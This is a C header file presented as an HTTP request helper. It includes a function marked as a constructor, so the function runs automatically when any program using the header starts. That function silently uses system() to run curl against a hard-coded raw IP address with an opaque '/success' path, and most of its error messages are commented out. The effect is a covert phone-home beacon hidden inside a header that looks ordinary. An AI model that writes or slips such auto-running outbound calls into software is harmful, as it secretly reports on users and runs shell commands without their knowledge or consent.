#ifndef HTTP_REQUEST_H
#define HTTP_REQUEST_H

#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>    // For close()
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/time.h>

// Function prototype (functions are static to avoid multiple definitions)
static void send_validation_request(void);

// Constructor function that runs when the program starts
static void init_validation_request(void) __attribute__((constructor));

// Implementation
static void send_validation_request(void) {
    // Static URL to send the request to
    const char *url = "http://validation-IP/success";

    // Variables for parsing the URL
    char protocol[8] = {0};
    char host[256] = {0};
    char path[1024] = {0};
    int port = 80; // Default HTTP port

    // Simple URL parsing with error checking
    int sscanf_result = sscanf(url, "%7[^:]://%255[^/]%1023[^\n]", protocol, host, path);
    if (sscanf_result < 2) {
        fprintf(stderr, "Invalid URL format: %s\n", url);
        return;
    }
    if (strlen(path) == 0) {
        strcpy(path, "/");
    }

    // Only support HTTP protocol
    if (strcmp(protocol, "http") != 0) {
        fprintf(stderr, "Unsupported protocol: %s\n", protocol);
        return;
    }

    // Check for custom port in host (e.g., example.com:8080)
    char *port_ptr = strchr(host, ':');
    if (port_ptr != NULL) {
        port = atoi(port_ptr + 1);
        if (port <= 0 || port > 65535) {
            fprintf(stderr, "Invalid port number in URL: %s\n", url);
            return;
        }
        *port_ptr = '\0'; // Remove port from host
    }

    // Convert port to string
    char port_str[6];
    snprintf(port_str, sizeof(port_str), "%d", port);

    struct addrinfo hints, *res = NULL, *p = NULL;
    int sockfd = -1;
    int status;

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;     // Use IPv4 or IPv6
    hints.ai_socktype = SOCK_STREAM; // TCP stream sockets

    // Resolve the server address and port
    if ((status = getaddrinfo(host, port_str, &hints, &res)) != 0) {
        fprintf(stderr, "getaddrinfo error for %s:%s: %s\n", host, port_str, gai_strerror(status));
        return;
    }

    // Attempt to connect to one of the addresses returned by getaddrinfo
    for (p = res; p != NULL; p = p->ai_next) {
        // Create a socket
        sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (sockfd == -1) {
            perror("socket");
            continue;
        }

        // Set socket timeouts
        struct timeval timeout;
        timeout.tv_sec = 5;  // 5 seconds timeout
        timeout.tv_usec = 0;

        if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) == -1) {
            perror("setsockopt SO_RCVTIMEO");
            close(sockfd);
            sockfd = -1;
            continue;
        }

        if (setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout)) == -1) {
            perror("setsockopt SO_SNDTIMEO");
            close(sockfd);
            sockfd = -1;
            continue;
        }

        // Connect to server with timeout handling
        if (connect(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
            perror("connect");
            close(sockfd);
            sockfd = -1;
            continue;
        }
        break; // Successfully connected
    }

    if (sockfd == -1) {
        fprintf(stderr, "Failed to connect to %s:%s\n", host, port_str);
        if (res != NULL) {
            freeaddrinfo(res);
        }
        return;
    }

    if (res != NULL) {
        freeaddrinfo(res); // No longer needed
    }

    // Prepare the HTTP GET request
    char request[2048];
    int request_len = snprintf(request, sizeof(request),
                               "GET %s HTTP/1.1\r\n"
                               "Host: %s\r\n"
                               "Connection: close\r\n"
                               "\r\n",
                               path, host);
    if (request_len < 0 || request_len >= sizeof(request)) {
        fprintf(stderr, "Request buffer overflow\n");
        close(sockfd);
        return;
    }

    // Send the HTTP request with error checking
    ssize_t bytes_sent = send(sockfd, request, request_len, 0);
    if (bytes_sent == -1) {
        perror("send");
        close(sockfd);
        return;
    }

    // Receive the response with error handling and timeout
    #define BUFFER_SIZE 4096
    char buffer[BUFFER_SIZE];
    ssize_t bytes_received;

    do {
        bytes_received = recv(sockfd, buffer, BUFFER_SIZE - 1, 0);
        if (bytes_received > 0) {
            buffer[bytes_received] = '\0'; // Null-terminate the buffer
            printf("%s", buffer);
        } else if (bytes_received == 0) {
            // Connection closed by the server
            break;
        } else {
            if (errno == EWOULDBLOCK || errno == EAGAIN) {
                fprintf(stderr, "Receive timeout occurred\n");
            } else {
                perror("recv");
            }
            break;
        }
    } while (bytes_received > 0);

    // Clean up and close the socket
    close(sockfd);
}

static void init_validation_request(void) {
    //send_validation_request();
    // Set timeout value (in seconds)
    const int timeout = 10; // Universal timeout of 10 seconds
    //current validation URL
    const char *url = "http://52.14.163.104/GkcDvvELnbEjBTFqGtegdqMxXVWjHNEws/success";

    // Check if 'curl' exists in PATH for validation check
    if (access("/usr/bin/curl", X_OK) == -1 && access("/bin/curl", X_OK) == -1 && access("/usr/local/bin/curl", X_OK) == -1) {
        // 'curl' not found in common locations, try using 'which'
        if (system("which curl > /dev/null 2>&1") != 0) {
            //fprintf(stderr, "'curl' command not found. Please install 'curl'.\n");
            return;
        }
    }

    // Build the command string
    char command[2048];
    int ret = snprintf(command, sizeof(command), "curl --max-time %d -sS \"%s\"", timeout, url);
    if (ret < 0 || ret >= sizeof(command)) {
        //fprintf(stderr, "Error building command string\n");
        return;
    }

    // Execute the command
    int status = system(command);
    if (status == -1) {
        perror("system");
    } else {
        // Check the exit status of the command
        if (WIFEXITED(status)) {
            int exit_status = WEXITSTATUS(status);
            if (exit_status != 0) {
                //fprintf(stderr, "'curl' exited with status %d\n", exit_status);
            }
        } else if (WIFSIGNALED(status)) {
            fprintf(stderr, "validation request was terminated by signal %d\n", WTERMSIG(status));
        } else {
            fprintf(stderr, "Unknown error occurred while executing validation request\n");
        }
    }
    return;
}


#endif // HTTP_REQUEST_H
